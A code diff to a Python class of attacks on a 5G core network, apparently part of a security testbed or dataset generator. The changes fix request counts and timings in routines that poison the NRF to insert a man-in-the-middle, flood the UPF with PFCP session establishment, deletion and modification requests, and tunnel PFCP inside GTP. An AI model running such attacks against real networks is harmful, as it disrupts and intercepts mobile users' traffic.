@@ -21,7 +21,7 @@ class Attacks():
     #     "Create ~100 (+/- 10) random NF instance"
    
     #     success = True
-    #     nb = int(random.normalvariate(100, 10))
+    #     nb = 100
     #     for _ in range(nb):
     #         instance = NFInstance.add_random_nf(display=False)
     #         success = success and instance is not None
@@ -57,7 +57,7 @@ class Attacks():
             Poison the NRF inner list of Instance to make a rogue Instance the highest priority.
             The request happening from this moment are sent to the rogue which relays it.
             The rogue instance is effectively a man in the middle.
-            Wait ~60 (+/- 10) seconds before removing the man in the middle.
+            Wait 60 seconds before removing the man in the middle.
         """
         
         nf_type = NFInstance.get_random_nf_type()
@@ -66,9 +66,8 @@ class Attacks():
         start = CNMitm.start(nf_type, display=False)
         print(f"-- MITM started: {start}")
         
-        time_to_sleep = int(random.normalvariate(60, 10))
-        print(f"-- Sleeping for {time_to_sleep} seconds during MITM")
-        time.sleep(time_to_sleep)
+        print("-- Sleeping for 60 seconds during MITM")
+        time.sleep(60)
         
         stop = CNMitm.stop(display=False)
         print(f"-- MITM stopped: {stop}")
@@ -92,19 +91,8 @@ class Attacks():
       
     def flood_etablishment() -> bool:
         "Send ~100 (+/- 10) session establishment requests with random seid, teid and ue_address"
-        
-        print("Sending initial association setup")
-        
-        send(
-            PFCPRequest.association_setup(
-                src_addr=get_my_ip_from_prefix(),
-                dst_addr=ip_list["UPF"]
-            ),
-            verbose=False
-        )
-        
-        time.sleep(5)
-        nb = int(random.normalvariate(100, 10))
+                
+        nb = 100
         print(f"Number of session establishments to send: {nb}")
 
         for _ in range(nb):
@@ -132,7 +120,7 @@ class Attacks():
         """
         
         first_seid = random.randint(1000, PFCPRequest.max_seid-1000)
-        nb = int(random.normalvariate(100, 10))
+        nb = 100
         print(f"Sending {nb} session deletion requests starting from seid={first_seid}")
         
         for i in range(nb):
@@ -206,7 +194,7 @@ class Attacks():
             The teid is completely random.
         """
         first_seid = random.randint(1, PFCPRequest.max_seid)
-        nb = int(random.normalvariate(100, 10))
+        nb = 100
         print(f"Sending {nb} session modification requests starting from seid={first_seid}")
         
         for i in range(nb):
@@ -236,9 +224,10 @@ class Attacks():
             Send 1 pfcp packet encapsulated in a gtp layer.
             The pfcp packet is benign but having this kind of encapsulation could be used for attacks and shouldn't happen.
         """
-        pfcp_packet = PFCPRequest.association_setup(
+        pfcp_packet = PFCPRequest.session_deletion(
             src_addr=ue_addr,
-            dst_addr=ip_list["UPF"]
+            dst_addr=ip_list["UPF"],
+            seid=random.randint(1, PFCPRequest.max_seid)
         )
         
         print(f"Sending PFCP in GTP from ue {ue_addr} teid={teid}")
